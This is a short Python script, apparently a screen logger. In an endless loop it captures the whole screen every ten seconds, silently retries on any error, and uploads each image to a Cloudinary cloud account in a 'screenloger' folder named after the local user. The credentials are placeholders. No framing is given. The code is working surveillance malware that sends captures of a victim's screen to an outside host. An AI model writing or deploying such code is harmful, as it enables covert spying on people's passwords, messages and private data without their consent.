from PIL import ImageGrab
from time import sleep, time
import io
import cloudinary
import cloudinary.uploader
from getpass import getuser

image_server = cloudinary.config(
  cloud_name = "secret",
  api_key = "secret",
  api_secret = "secret"
)

def screenCapture():
    screenshot = ImageGrab.grab()
    filename = str(int(time()*1000))+".jpg"
    with io.BytesIO() as img_byte_array:
        screenshot.save(img_byte_array, 'PNG')
        cloudinary.uploader.upload(img_byte_array.getvalue(), folder="/screenloger/" + getuser(), public_id=filename, type="authenticated")
    print(f"file {filename} is saved")

def logScreen():
    while True:
        try:
            screenCapture()
            sleep(10)
        except:
            sleep(10)

